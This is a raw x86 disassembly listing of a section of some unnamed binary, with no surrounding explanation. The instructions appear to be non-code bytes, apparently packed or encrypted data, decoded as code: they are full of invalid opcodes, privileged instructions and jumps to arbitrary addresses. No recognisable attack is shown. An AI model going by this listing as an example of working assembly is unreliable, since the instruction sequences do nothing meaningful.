  40c758:	test   bh,cl
  40c75a:	add    ch,0x35
  40c75d:	pop    edx
  40c75e:	push   ecx
  40c75f:	clc    
  40c760:	cmp    DWORD PTR [ebx],esi
  40c762:	std    
  40c763:	sbb    BYTE PTR [edi-0x29],0xfd
  40c767:	test   BYTE PTR [esi+0xefecebe],ah
  40c76d:	or     eax,0xc62cfed0
  40c772:	sbb    eax,0xbcf53941
  40c777:	sar    DWORD PTR ds:0xdd8b37d7,0x5a
  40c77e:	enter  0x53f7,0xd7
  40c782:	pop    eax
  40c783:	das    
  40c784:	fsubp  st(4),st
  40c786:	sti    
  40c787:	out    0x98,eax
  40c789:	call   0x1d01c65c
  40c78e:	sar    BYTE PTR [edi+0x4],1
  40c791:	mov    ebp,0xd7394140
  40c796:	push   edi
  40c797:	sub    DWORD PTR [ecx],esp
  40c799:	mov    al,BYTE PTR [eax+0x41]
  40c79c:	cmp    DWORD PTR [edi-0x2907bf22],ebp
  40c7a2:	(bad)  
  40c7a4:	pop    ds
  40c7a5:	ss iret 
  40c7a7:	test   BYTE PTR [ecx-0x4d],bh
  40c7aa:	sub    ebp,DWORD PTR [eax+0x5e]
  40c7ad:	cdq    
  40c7ae:	inc    ebx
	...
  40c7c3:	add    BYTE PTR [ecx],dl
  40c7c5:	fld    QWORD PTR [eax+0x41]
  40c7c8:	cmp    DWORD PTR [edi],edi
  40c7ca:	mov    dl,0x7d
  40c7cc:	jbe    0x40c7ec
  40c7ce:	mov    BYTE PTR [edi+ebx*1],0x0
  40c7d2:	stos   DWORD PTR es:[edi],eax
  40c7d3:	inc    esp
  40c7d4:	cmp    edi,edi
  40c7d6:	imul   edx,DWORD PTR [ecx],0x3a8422a
  40c7dc:	cmp    DWORD PTR [ebx+edx*8-0x3a],edx
  40c7e0:	cmc    
  40c7e1:	(bad)  
  40c7e2:	call   0xd24100ea
  40c7e7:	ret    
  40c7e8:	out    dx,al
  40c7e9:	das    
  40c7ea:	cdq    
  40c7eb:	or     BYTE PTR [ebp+0x45ce9ac8],0x11
  40c7f2:	sub    eax,DWORD PTR [ebp+0x39]
  40c7f5:	sub    DWORD PTR [eax-0x926c4b4],0xffffff82
  40c7fc:	xchg   ebp,eax
  40c7fd:	enter  0x58e8,0x3b
  40c801:	(bad)  
  40c803:	into   
  40c804:	(bad)  
  40c805:	enter  0x58bd,0x31
  40c809:	fdivr  DWORD PTR [edx]
  40c80b:	retf   
  40c80c:	test   esp,0x78f13861
  40c812:	cli    
  40c813:	into   
  40c814:	ins    DWORD PTR es:[edi],dx
  40c815:	enter  0x319d,0x31
  40c819:	int    0x1b
  40c81b:	cld    
  40c81c:	fidivr WORD PTR [ecx]
  40c81e:	mov    esi,cs
  40c820:	iret   
  40c821:	int3   
  40c822:	sti    
  40c823:	sti    
  40c824:	ficomp WORD PTR [eax]
  40c826:	jg     0x40c7f6
	...
  40c83c:	mov    edi,0xb7cffbcc
  40c841:	push   edx
  40c842:	loope  0x40c81f
  40c844:	or     cl,BYTE PTR [edi+0x66]
  40c847:	into   
  40c848:	jno    0x40c80b
  40c84a:	in     al,0x3
  40c84c:	add    al,0x79
  40c84e:	inc    esp
  40c84f:	cmp    BYTE PTR [edx-0x31],0xb6
  40c853:	ss jmp 0xe901:0x7fff9b78
  40c85b:	add    edi,DWORD PTR [ecx]
  40c85d:	add    BYTE PTR [eax],al
  40c85f:	ss adc eax,edi
  40c862:	out    0x6d,eax
  40c864:	idiv   bh
  40c866:	jmp    FWORD PTR [ecx+0x72]
  40c869:	push   DWORD PTR [esi-0x10]
  40c86c:	inc    ebx
  40c86d:	rcr    BYTE PTR [edx-0x4a],0x24
  40c871:	mov    bh,0xc1
  40c873:	loope  0x40c8af
  40c875:	scas   eax,DWORD PTR es:[edi]
  40c876:	out    0x72,eax
  40c878:	add    esp,edi
  40c87a:	mov    bl,ch
  40c87c:	ret    
  40c87d:	mov    ah,0xe
  40c87f:	imul   esp,eax,0xffffffcb
  40c882:	(bad)  
  40c883:	jmp    0x72491d3b
  40c888:	jbe    0x40c882
  40c88a:	jmp    0xe969:0x5779743
  40c891:	sbb    esi,DWORD PTR [edx-0x1d]
  40c894:	mov    edx,0x3e3e38c7
  40c899:	sub    bl,0xf9
  40c89c:	loope  0x40c884
  40c89e:	jg     0x40c855
	...
  40c8b4:	jp     0x40c904
  40c8b6:	or     eax,0x77460969
  40c8bb:	icebp  
  40c8bc:	mov    edx,0xf16940d7
  40c8c1:	stc    
  40c8c2:	jmp    0x1f2e:0x5ac031e0
  40c8c9:	mov    ecx,0xc3af1c1
  40c8ce:	xor    bl,bh
  40c8d0:	ret    0x3907
  40c8d3:	(bad)  
  40c8d4:	ds sbb al,0x30
  40c8d7:	and    BYTE PTR [edi+eax*1+0x7a0db41],0x46
  40c8df:	(bad)  
  40c8e0:	xor    al,0x1c
  40c8e2:	inc    ecx
  40c8e3:	in     eax,dx
  40c8e4:	nop
  40c8e5:	(bad)  
  40c8e6:	or     BYTE PTR [edx],al
  40c8e8:	jne    0x40c910
  40c8ea:	pop    edi
  40c8eb:	add    dh,bl
  40c8ed:	xchg   al,al
  40c8ef:	or     BYTE PTR [eax+0x5a04debf],dl
  40c8f5:	ret    
  40c8f6:	test   al,0x4b
  40c8f8:	jecxz  0x40c8bb
  40c8fa:	add    BYTE PTR [ebx],cl
  40c8fc:	sti    
  40c8fd:	xor    ah,BYTE PTR [edx-0x2346a75]
  40c903:	xor    bh,bl
  40c905:	inc    edx
  40c906:	clc    
  40c907:	jmp    DWORD PTR [ebp+0x3c458dc7]
  40c90d:	lds    eax,FWORD PTR [ebx-0xc]
  40c910:	push   eax
  40c911:	(bad)  
  40c912:	(bad)  
  40c913:	jmp    DWORD PTR [ebx+0x2956fb]
	...
  40c929:	add    BYTE PTR [eax],al
  40c92b:	add    cl,ah
  40c92d:	(bad)  
  40c92e:	push   DWORD PTR [ebx+0x66]
  40c931:	dec    ebx
  40c932:	inc    esp
  40c933:	lock pusha 
  40c935:	add    DWORD PTR es:[edx+0x20],ebp
  40c939:	sub    DWORD PTR [eax],eax
  40c93b:	push   0x20
  40c93d:	sub    DWORD PTR [eax],eax
  40c93f:	lea    edx,[ebp-0x44]
  40c942:	dec    esi
  40c943:	jmp    ebp
  40c945:	adc    ebp,DWORD PTR [ecx]
  40c947:	inc    ecx
  40c948:	loopne 0x40c911
  40c94a:	mov    esi,0x7b7fea74
  40c94f:	hlt    
  40c950:	shl    BYTE PTR [edx],1
  40c952:	xor    al,0x8b
  40c954:	adc    eax,0xb04d8b00
  40c959:	test   DWORD PTR [edi],0x89bafa77
  40c95f:	jne    0x40c9a5
  40c961:	dec    eax
  40c962:	jl     0x40c96c
  40c964:	dec    ebx
  40c965:	or     dh,al
  40c967:	jecxz  0x40c90b
  40c969:	scas   eax,DWORD PTR es:[edi]
  40c96a:	mov    ds:0xff00558b,al
  40c96f:	jne    0x40c971
  40c971:	dec    esp
  40c972:	(bad)  
  40c973:	inc    BYTE PTR [ebp+0x39e3e6b2]
  40c979:	xchg   esi,eax
  40c97a:	add    al,BYTE PTR [eax]
  40c97c:	rcl    edi,1
  40c97e:	add    al,BYTE PTR [eax]
  40c980:	cmp    DWORD PTR [esi+0x16705e2b],ebx
  40c986:	sti    
  40c987:	jmp    DWORD PTR [ebx]
  40c989:	sbb    DWORD PTR [eax],ebp
  40c98b:	pop    edi
  40c98c:	mov    ecx,cr0
  40c98f:	pop    es
	...
  40c9a4:	cmp    DWORD PTR [edi+esi*2-0x3cdb4515],ecx
  40c9ab:	cmp    DWORD PTR [bx+di+0x2],edi
  40c9b0:	popa   
  40c9b1:	cmp    DWORD PTR [ecx-0x1],edx
  40c9b4:	inc    esi
  40c9b5:	dec    edi
  40c9b6:	inc    esi
  40c9b7:	cld    
  40c9b8:	rcr    eax,1
  40c9ba:	and    al,BYTE PTR [eax]
  40c9bc:	cmp    edi,edi
  40c9be:	nop
  40c9bf:	jno    0x40c9ef
  40c9c1:	fstp   TBYTE PTR [eax+0x44]
  40c9c4:	and    DWORD PTR [eax],esi
  40c9c6:	add    al,0x20
  40c9c8:	cmp    edi,edx
  40c9ca:	fisub  DWORD PTR [ebx+ecx*4+0x7488cab2]
  40c9d1:	mov    bl,0x5b
  40c9d3:	add    BYTE PTR [ecx-0x29],bl
  40c9d6:	add    ch,al
  40c9d8:	mov    eax,ds:0xc0fecb05
  40c9dd:	sbb    al,0xd4
  40c9df:	addr16 cmp edi,esi
  40c9e2:	add    eax,DWORD PTR [eax]
  40c9e4:	ror    DWORD PTR [esi+0x56],1
  40c9e7:	(bad)  
  40c9e8:	ficom  WORD PTR [eax+0x41]
  40c9eb:	in     al,dx
  40c9ec:	popa   
  40c9ed:	xlat   BYTE PTR ds:[ebx]
  40c9ee:	and    al,BYTE PTR [eax]
  40c9f0:	cmp    DWORD PTR [edi+0x49],edi
  40c9f3:	jb     0x40c9bb
  40c9f5:	cmp    BYTE PTR [esp+eax*2-0x2f],0xef
  40c9fa:	add    esp,DWORD PTR [eax]
  40c9fc:	cmp    edi,edx
  40c9fe:	fidiv  DWORD PTR [eax+0x2b]
  40ca01:	pop    edx
  40ca02:	retf   
  40ca03:	mov    ah,bh
  40ca05:	dec    DWORD PTR [ebx+ecx*8+0x0]
	...
  40ca19:	add    BYTE PTR [eax],al
  40ca1b:	add    BYTE PTR ds:0xfa11d0f0,ah
  40ca21:	ds jmp 0x410ccff1
  40ca27:	jnp    0x40ca23
  40ca29:	(bad)  
  40ca2a:	call   0x3e3d44b5
  40ca2f:	push   ecx
  40ca30:	dec    ecx
  40ca31:	pop    eax
  40ca32:	mov    al,ds:0x2dfff846
  40ca37:	push   ecx
  40ca38:	popa   
  40ca39:	fsub   DWORD PTR [edi+edi*1-0x3f95ffc7]
  40ca40:	inc    edx
  40ca41:	leave  
  40ca42:	fwait
  40ca43:	repz (bad) 
  40ca45:	sub    DWORD PTR [edx+0x7bc93944],ebp
  40ca4b:	iret   
  40ca4c:	push   esi
  40ca4d:	push   edi
  40ca4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca4f:	add    edi,DWORD PTR [ecx]
  40ca51:	jge    0x40ca7f
  40ca53:	clc    
  40ca54:	das    
  40ca55:	push   ebx
  40ca56:	fstp   DWORD PTR [ebx-0x5c]
  40ca59:	cmp    eax,0x531e0428
  40ca5e:	(bad)  
  40ca60:	ins    BYTE PTR es:[edi],dx
  40ca61:	inc    esp
  40ca62:	jmp    0xdd04846a
  40ca67:	retf   0xf08d
  40ca6a:	push   eax
  40ca6b:	je     0x40cae8
  40ca6d:	aas    
  40ca6e:	jmp    0xc11d383d
  40ca73:	inc    esi
  40ca74:	jne    0x40ca76
  40ca76:	jmp    0xa63cc501
  40ca7b:	push   eax
  40ca7c:	sub    eax,0x464758
	...
  40ca91:	add    BYTE PTR [eax],al
  40ca93:	add    BYTE PTR [eax+0x0],bh
  40ca96:	xchg   esi,eax
  40ca97:	push   eax
  40ca98:	loope  0x40ca71
  40ca9a:	fdivr  DWORD PTR [edi]
  40ca9c:	cmp    DWORD PTR [eax],eax
  40ca9e:	push   0xffffffbf
  40caa0:	xor    cl,cl
  40caa2:	repz repz push ds
  40caa5:	mov    ?,edi
  40caa7:	sub    esp,esi
  40caa9:	(bad)  
  40caaa:	(bad)  
  40caab:	hlt    
  40caac:	xchg   al,ah
  40caae:	sbb    al,0xad
  40cab0:	cmp    al,BYTE PTR [eax]
  40cab2:	and    DWORD PTR ds:0x5600568e,0xffffffe9
  40cab9:	retf   
  40caba:	(bad)  
  40cabb:	aam    0x8e
  40cabd:	leave  
  40cabe:	xor    al,0xbc
  40cac0:	sbb    eax,0xab51003f
  40cac5:	dec    esp
  40cac6:	push   DWORD PTR [esi]
  40cac8:	in     eax,dx
  40cac9:	inc    ebx
  40caca:	loopne 0x40ca8f
  40cacc:	cmp    cl,cl
  40cace:	je     0x40caf1
  40cad0:	jae    0x40cb25
  40cad2:	or     al,0x1e
  40cad4:	sub    DWORD PTR [ebx+0x29],edx
  40cad7:	test   al,0x3a
  40cad9:	fadd   st,st(0)
  40cadb:	xchg   ebp,eax
  40cadc:	jae    0x40caa7
  40cade:	mov    BYTE PTR [esi+edx*4-0x7901ffaa],ch
  40cae5:	int3   
  40cae6:	(bad)  
  40cae7:	jl     0x40cb0f
  40cae9:	(bad)  
  40caea:	xor    al,0x74
  40caec:	inc    ebp
  40caed:	inc    ecx
  40caee:	add    cl,dl
  40caf0:	mov    esp,0x92deff53
  40caf5:	cmp    al,0xd8
  40caf7:	inc    ebx
	...
  40cb0c:	xor    eax,0xf0d974c7
  40cb11:	dec    esp
  40cb12:	call   0x298df9dd
  40cb17:	sub    BYTE PTR ds:0x3d94d8,bh
  40cb1d:	(bad)  
  40cb1e:	mov    BYTE PTR [ecx+ebp*4],ah
  40cb21:	pop    ecx
  40cb22:	add    BYTE PTR [esi+0x14fed46e],ah
  40cb28:	cmc    
  40cb29:	(bad)  
  40cb2a:	xor    al,0x1c
  40cb2c:	xor    al,BYTE PTR [ecx+0x0]
  40cb2f:	xor    DWORD PTR [eax+0x4c],0x4bb700ff
  40cb36:	inc    esp
  40cb37:	shl    BYTE PTR ds:0x2750c007,1
  40cb3d:	aaa    
  40cb3e:	in     al,0xff
  40cb40:	lods   eax,DWORD PTR ds:[esi]
  40cb41:	iret   
  40cb42:	std    
  40cb43:	xor    eax,0x40ea7d
  40cb48:	call   0xe8403fad
  40cb4d:	dec    edx
  40cb4e:	inc    esp
  40cb4f:	int3   
  40cb50:	adc    edi,DWORD PTR [edi]
  40cb52:	loopne 0x40cb54
  40cb54:	xchg   DWORD PTR [edi-0x4a],eax
  40cb57:	add    BYTE PTR [eax+0x3],ah
  40cb5a:	cmp    DWORD PTR [ebp+0x4c],0xfffffffc
  40cb5e:	push   cs
  40cb5f:	test   ch,ah
  40cb61:	sti    
  40cb62:	(bad)  
  40cb63:	call   ebx
  40cb65:	rol    BYTE PTR ds:[eax],1
  40cb68:	addr16 inc edi
  40cb6a:	mov    ds:0x8d036000,al
  40cb6f:	inc    ebp
	...
  40cb84:	sbb    al,0xc
  40cb86:	push   DWORD PTR [ebp+0x1c]
  40cb89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb8a:	dec    esi
  40cb8b:	std    
  40cb8c:	aaa    
  40cb8d:	mov    eax,0x4717c009
  40cb92:	mov    es,WORD PTR [eax]
  40cb94:	adc    BYTE PTR [ebx],al
  40cb96:	cmp    DWORD PTR [ebp-0x34],0x2
  40cb9a:	je     0x40cf3d
  40cba0:	xchg   ebp,eax
  40cba1:	push   es
  40cba2:	enter  0xf750,0x35
  40cba6:	shr    al,1
  40cba8:	add    bh,BYTE PTR [esi-0x3d140003]
  40cbae:	jb     0x40cc25
  40cbb0:	arpl   WORD PTR [esi],di
  40cbb2:	enter  0x2c00,0x29
  40cbb6:	push   0xbca7d010
  40cbbb:	jmp    FWORD PTR ds:0x3976e6c4
  40cbc1:	cld    
  40cbc2:	enter  0xc6fe,0xeb
  40cbc6:	jecxz  0x40cbc6
  40cbc8:	inc    esp
  40cbc9:	rcr    edx,1
  40cbcb:	int3   
  40cbcc:	and    al,0x46
  40cbce:	enter  0x24fe,0x6d
  40cbd2:	(bad)  
  40cbd3:	je     0x40cc06
  40cbd5:	add    esp,0xc85d9e6c
  40cbdb:	je     0x40cc4e
  40cbdd:	and    eax,0x65a1084e
  40cbe2:	push   ebp
  40cbe3:	inc    DWORD PTR [esi+0xc44e35]
	...
  40cbf9:	add    BYTE PTR [eax],al
  40cbfb:	add    BYTE PTR [esi-0x7d],bh
  40cbfe:	scas   al,BYTE PTR es:[edi]
  40cbff:	(bad)  
  40cc00:	in     al,dx
  40cc01:	rcr    dl,1
  40cc03:	jl     0x40cbe1
  40cc05:	or     eax,0x20ecfec8
  40cc0a:	enter  0x8974,0x1d
  40cc0e:	dec    esi
  40cc0f:	or     BYTE PTR [ecx+0x75],ah
  40cc12:	push   ebp
  40cc13:	dec    DWORD PTR [esi+0x59]
  40cc16:	inc    esi
  40cc17:	int3   
  40cc18:	cmp    DWORD PTR [ebp-0x13],ebp
  40cc1b:	cmp    BYTE PTR [eax+ebx*1+0x524674ff],0x3e
  40cc23:	int3   
  40cc24:	cs mov bh,al
  40cc27:	je     0x40cc5a
  40cc29:	jmp    DWORD PTR [edx]
  40cc2b:	ins    DWORD PTR es:[edi],dx
  40cc2c:	push   ds
  40cc2d:	(bad)  
  40cc2f:	or     DWORD PTR [ebx+0x4174c5d7],esp
  40cc35:	mov    edi,0xb7066cef
  40cc3a:	(bad)  
  40cc3b:	je     0x40cc3a
  40cc3d:	scas   eax,DWORD PTR es:[edi]
  40cc3e:	sub    BYTE PTR [edi-0xa],0x86
  40cc42:	(bad)  
  40cc43:	je     0x40cc36
  40cc45:	mov    edi,0x96e6704a
  40cc4a:	(bad)  
  40cc4b:	je     0x40cc32
  40cc4d:	add    BYTE PTR [ecx-0x623ab6ad],dl
  40cc53:	mov    DWORD PTR [ebp-0x30],0xc5495b80
  40cc5a:	(bad)  
  40cc5b:	mov    DWORD PTR [ebp-0x2c],0x6390
	...
  40cc72:	add    BYTE PTR [eax],al
  40cc74:	sub    ebp,eax
  40cc76:	jge    0x40cc3f
  40cc78:	and    eax,0x292b80d8
  40cc7d:	lds    ebp,FWORD PTR [ebp-0x39]
  40cc80:	and    eax,0x93350dc
  40cc85:	lds    ebx,FWORD PTR [ebp-0x39]
  40cc88:	add    eax,0x93b40e0
  40cc8d:	lds    ecx,FWORD PTR [ebp-0x39]
  40cc90:	add    eax,0xe94350a4
  40cc95:	les    edi,FWORD PTR ds:0x40a7e5c7
  40cc9b:	or     ebp,ecx
  40cc9d:	les    ebp,FWORD PTR ds:0x10abe5c7
  40cca3:	adc    ecx,ecx
  40cca5:	les    ebx,FWORD PTR ds:0xafc5c7
  40ccab:	sbb    ecx,ecx
  40ccad:	les    ecx,FWORD PTR ds:0x10b3c5c7
  40ccb3:	and    ebp,DWORD PTR [ecx-0x743023b]
  40ccb9:	repz call 0x68147eef
  40ccbf:	rcl    BYTE PTR [esi],0xcd
  40ccc2:	in     eax,0xc6
  40ccc4:	lds    edi,FWORD PTR [edx]
  40ccc6:	fnsave [ebx]
  40ccc8:	push   cs
  40ccc9:	dec    ebx
  40ccca:	in     eax,0xc6
  40cccc:	dec    ebp
  40cccd:	dec    ebx
  40ccce:	add    BYTE PTR [ebp+0x39],al
  40ccd1:	fmul   DWORD PTR [edx+eax*2+0x39]
  40ccd5:	add    dl,dh
  40ccd7:	ret    
	...
  40ccec:	aas    
  40cced:	jnp    0x40ccee
  40ccef:	fdivr  QWORD PTR ds:0x79a60000
  40ccf5:	enter  0xe8ff,0x3a
  40ccf9:	add    bh,al
  40ccfb:	and    al,0xe9
  40ccfd:	lds    eax,FWORD PTR [esi]
  40ccff:	jmp    0x341273e
  40cd04:	xor    eax,0x3d13005a
  40cd09:	jae    0x40cd4f
  40cd0b:	jne    0x40cd77
  40cd0d:	jae    0x40cc93
  40cd0f:	jns    0x40cd88
  40cd11:	(bad)  
  40cd14:	jbe    0x40cd61
  40cd16:	clc    
  40cd17:	jmpw   0xb4de
  40cd1b:	pop    ss
  40cd1c:	sti    
  40cd1d:	(bad)  
  40cd1e:	jmp    ecx
  40cd20:	jp     0x40cd72
  40cd22:	add    eax,0xfec4cf40
  40cd27:	jmp    0xa868ab3e
  40cd2c:	cmp    al,ch
  40cd2e:	je     0x40cd15
  40cd30:	and    BYTE PTR [edi],0x73
  40cd33:	cs ja  0x40cd6a
  40cd36:	mov    edi,DWORD PTR [ecx]
  40cd38:	sar    DWORD PTR [ebx-0x11],1
  40cd3b:	push   ss
  40cd3c:	ja     0x40cd03
  40cd3e:	dec    edi
  40cd3f:	mov    ebx,0xe733762
  40cd44:	ja     0x40cdbd
  40cd46:	test   BYTE PTR [ecx],dl
  40cd48:	pop    es
  40cd49:	ret    
  40cd4a:	(bad)  
  40cd4b:	adc    DWORD PTR [edi+0xf6ff52],edx
	...
  40cd61:	add    BYTE PTR [eax],al
  40cd63:	add    BYTE PTR [esi-0x7d660fc4],ch
  40cd69:	push   ss
  40cd6a:	inc    ebx
  40cd6b:	sub    BYTE PTR ds:0xfcd1b4c3,bh
  40cd71:	ret    0xd6fe
  40cd74:	ss dec ebp
  40cd76:	sub    DWORD PTR [eax],ebp
  40cd78:	xor    eax,0x32009cd8
  40cd7d:	mov    ebp,0xa85589fd
  40cd82:	cmc    
  40cd83:	jmp    FWORD PTR [edi-0x5813447f]
  40cd89:	mov    ebp,0x163400fd
  40cd8e:	cmp    DWORD PTR [ebp-0x50],0x0
  40cd92:	jne    0x40cddd
  40cd94:	pop    ebx
  40cd95:	inc    ebx
  40cd96:	jmp    0x40cd8f
  40cd98:	scas   eax,DWORD PTR es:[edi]
  40cd99:	mov    ebp,0x432f30fd
  40cd9e:	jmp    0x40cd97
  40cda0:	das    
  40cda1:	mov    ebp,0xb5bcbd7f
  40cda6:	std    
  40cda7:	(bad)  
  40cda8:	mov    eax,0x76000001
  40cdad:	leave  
  40cdae:	lds    eax,FWORD PTR [ebp-0x24b04]
  40cdb4:	clc    
  40cdb5:	add    BYTE PTR [eax],al
  40cdb7:	add    bl,bh
  40cdb9:	aad    0xfd
  40cdbb:	lea    ecx,[esi*4+0x732ffffd]
  40cdc2:	jmp    0xb5:0xfdbd2ff7
	...
  40cdd9:	add    BYTE PTR [eax],al
  40cddb:	add    al,bh
  40cddd:	mov    ah,0xfd
  40cddf:	call   FWORD PTR [edi]
  40cde1:	xor    ecx,DWORD PTR [eax]
  40cde3:	call   0x3e8980
  40cde8:	sar    DWORD PTR [edx-0x16],cl
  40cdeb:	imul   DWORD PTR [edi]
  40cded:	mov    ebp,0xbd5d74fe
  40cdf2:	mov    bl,0xec
  40cdf4:	daa    
  40cdf5:	mov    esp,0x2c0ce8fd
  40cdfa:	(bad)  
  40cdfb:	dec    DWORD PTR [edi]
  40cdfd:	jb     0x40cde9
  40cdff:	neg    DWORD PTR [edi]
  40ce01:	mov    esp,0xbd7f11e6
  40ce06:	std    
  40ce07:	(bad)  
  40ce08:	cmp    DWORD PTR [edx+ebx*8-0xa],esp
  40ce0c:	(bad)  
  40ce0d:	mov    cl,0xc3
  40ce0f:	je     0x40ce52
  40ce11:	mov    cl,0xde
  40ce13:	std    
  40ce14:	out    dx,al
  40ce15:	add    ebx,0xc381d1b4
  40ce1b:	(bad)  
  40ce1c:	rcl    DWORD PTR [eax-0x662900ac],1
  40ce22:	cmp    eax,0xc49de0f8
  40ce27:	inc    dh
  40ce29:	imul   ecx,DWORD PTR [ebp-0x4],0x4316d1
  40ce30:	cmp    DWORD PTR [eax-0x13c6f840],edx
  40ce36:	js     0x40ce23
  40ce38:	mov    edx,0x3969c694
  40ce3d:	call   DWORD PTR [ebx]
  40ce3f:	inc    DWORD PTR [eax]
	...
  40ce51:	add    BYTE PTR [eax],al
  40ce53:	add    BYTE PTR [ecx+edx*8],cl
  40ce56:	fimul  DWORD PTR [ecx]
  40ce58:	sbb    eax,0xfc88c422
  40ce5d:	sub    al,0x5b
  40ce5f:	adc    al,0xfa
  40ce61:	xchg   edi,eax
  40ce62:	add    bh,bh
  40ce64:	in     al,dx
  40ce65:	rcr    dl,1
  40ce67:	mov    ds:0xfec4016f,al
  40ce6c:	in     al,dx
  40ce6d:	or     al,0xc4
  40ce6f:	je     0x40cea2
  40ce71:	inc    ecx
  40ce72:	push   cs
  40ce73:	ins    BYTE PTR es:[edi],dx
  40ce74:	push   esi
  40ce75:	sbb    DWORD PTR [edx+0x2dd935c1],edi
  40ce7b:	mov    edx,DWORD PTR [ebp+0x55]
  40ce7e:	mov    edi,0x5889e7fb
  40ce83:	add    BYTE PTR [ebx+0x4174c388],ah
  40ce89:	out    dx,eax
  40ce8a:	stos   DWORD PTR es:[edi],eax
  40ce8b:	push   0x26
  40ce8d:	retf   
  40ce8e:	js     0x40ced4
  40ce90:	sbb    eax,0x618e0e5f
  40ce95:	add    BYTE PTR [eax],ch
  40ce97:	add    al,0xc2
  40ce99:	add    edi,DWORD PTR [ebx-0x14]
  40ce9c:	jns    0x40ce9e
  40ce9e:	imul   eax,DWORD PTR [ebx],0x2c244c39
  40cea4:	cld    
  40cea5:	cmp    eax,0xd8860428
  40ceaa:	fadd   QWORD PTR [ecx+edi*1+0x0]
  40ceae:	loop   0x40ce73
  40ceb0:	push   0xffffffe1
  40ceb2:	push   ss
  40ceb3:	lods   al,BYTE PTR ds:[esi]
  40ceb4:	pop    ss
  40ceb5:	dec    eax
  40ceb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceb7:	ret    
	...
  40cecc:	jle    0x40cf26
  40cece:	jmp    0xc3a4d6
  40ced3:	sar    DWORD PTR [ebx+0x3f],cl
  40ced6:	jmp    0xf18c852e
  40cedb:	stos   DWORD PTR es:[edi],eax
  40cedc:	imul   ebp,DWORD PTR [ebp+0x7d],0x7239ec3
  40cee3:	ret    
  40cee4:	lahf   
  40cee5:	aad    0xe7
  40cee7:	dec    ecx
  40cee8:	mov    ecx,0x9338e902
  40ceed:	cmp    bl,BYTE PTR [ebp-0x9]
  40cef0:	mov    BYTE PTR [edi-0x3e803cab],0x5a
  40cef7:	jb     0x40cf27
  40cef9:	stc    
  40cefa:	mov    ebx,0x3d4b6f7e
  40ceff:	ret    
  40cf00:	in     eax,dx
  40cf01:	test   DWORD PTR [eax+0x7d],0x632dc0d3
  40cf08:	div    DWORD PTR [esi+0x2b39082a]
  40cf0e:	jb     0x40cec0
  40cf10:	mov    ebx,0x765710bc
  40cf15:	cmp    edx,DWORD PTR [ecx]
  40cf17:	add    al,0x39
  40cf19:	add    cl,ch
  40cf1b:	retf   0xc475
  40cf1e:	call   0x410826
  40cf23:	bound  esi,QWORD PTR [eax-0xc]
  40cf26:	xor    BYTE PTR [ecx+0x12094b3a],0xf5
  40cf2d:	adc    eax,0x42d2
	...
  40cf42:	add    BYTE PTR [eax],al
  40cf44:	hlt    
  40cf45:	mov    esi,0x7fe90b
  40cf4a:	add    cl,ch
  40cf4c:	cmp    dl,ch
  40cf4e:	pusha  
  40cf4f:	push   0x79
  40cf51:	lock push DWORD PTR [eax+esi*1]
  40cf55:	jne    0x40cf9b
  40cf57:	fldcw  WORD PTR [ebp+0x2934fee8]
  40cf5d:	shl    DWORD PTR [ecx+esi*8-0x5e],0xb1
  40cf62:	addr16 sahf 
  40cf64:	sti    
  40cf65:	jge    0x40cf61
  40cf67:	loopne 0x40cf6a
  40cf69:	sti    
  40cf6a:	or     BYTE PTR [esi*8-0x5fe6ba2b],ah
  40cf71:	inc    ecx
  40cf72:	(bad)  
  40cf73:	jle    0x40cff0
  40cf75:	test   DWORD PTR [ecx+esi*2+0x2],0x3ae97f97
  40cf7d:	add    BYTE PTR [ebp-0x15],dh
  40cf80:	fisttp WORD PTR ds:0x4b326283
  40cf86:	adc    eax,0x8ac7f162
  40cf8b:	mov    ah,0xb6
  40cf8d:	icebp  
  40cf8e:	mov    ds:0xdfbf422b,eax
  40cf93:	icebp  
  40cf94:	mov    ch,0x3b
  40cf96:	clc    
  40cf97:	pusha  
  40cf98:	add    esp,eax
  40cf9a:	jmp    0xf172:0xf83bc7da
  40cfa1:	ret    
  40cfa2:	push   cs
  40cfa3:	inc    ebp
  40cfa4:	jl     0x40cf9f
  40cfa6:	ror    BYTE PTR [ecx],0x0
	...
  40cfb9:	add    BYTE PTR [eax],al
  40cfbb:	add    BYTE PTR [ebx],dh
  40cfbd:	ja     0x40d003
  40cfbf:	adc    ebp,eax
  40cfc1:	push   esp
  40cfc2:	cld    
  40cfc3:	add    bl,ah
  40cfc5:	xchg   cl,bh
  40cfc7:	or     DWORD PTR [esi+0x1445899d],ebp
  40cfcd:	xchg   DWORD PTR [esi],esi
  40cfcf:	add    BYTE PTR [ebp+0x2bc02b09],cl
  40cfd5:	(bad)  
  40cfd6:	jmp    0xf8885ae1
  40cfdb:	mov    edi,DWORD PTR ds:0xa2c959c0
  40cfe1:	adc    BYTE PTR [eax],al
  40cfe3:	push   ebp
  40cfe4:	imul   esi,DWORD PTR [eax-0x7f],0xffffffc4
  40cfe8:	lods   al,BYTE PTR ds:[esi]
  40cfe9:	and    eax,ebx
  40cfeb:	adc    WORD PTR [ecx+edi*1],ax
  40cfef:	inc    ebp
  40cff0:	hlt    
  40cff1:	stc    
  40cff2:	add    eax,0xc0cba02b
  40cff7:	adc    al,dl
  40cff9:	shl    BYTE PTR [ebx],0xc4
  40cffc:	cs inc ebx
  40cffe:	add    al,ch
  40d000:	inc    edi
  40d001:	out    dx,eax
  40d002:	(bad)  
  40d003:	jmp    FWORD PTR [ecx]
  40d005:	inc    edi
  40d006:	clc    
  40d007:	lea    ebx,[ebp-0x40]
  40d00a:	dec    esi
  40d00b:	call   0x3fb804
  40d010:	daa    
  40d011:	not    DWORD PTR [ebx]
  40d013:	jmp    FWORD PTR [ebp+0xf]
  40d016:	push   DWORD PTR [ebp+0x18]
  40d019:	shl    DWORD PTR [ebx+0x8],0xf8
  40d01d:	sub    ah,BYTE PTR [esi-0x1]
	...
  40d034:	pop    es
  40d035:	or     eax,0x29dc0fc0
  40d03a:	(bad)  
  40d03b:	call   DWORD PTR [eax-0x40]
  40d03e:	jae    0x40d04c
  40d040:	daa    
  40d041:	div    edi
  40d043:	dec    DWORD PTR [ebp-0x42061981]
  40d049:	sar    ch,0x8b
  40d04c:	popf   
  40d04d:	(bad)  
  40d04f:	inc    ebp
  40d050:	cmp    DWORD PTR [ecx-0x57227cf1],edi
  40d056:	add    al,BYTE PTR [eax]
  40d058:	cs cmp al,0x17
  40d05b:	jmp    FWORD PTR [ecx+esi*4-0x49695e56]
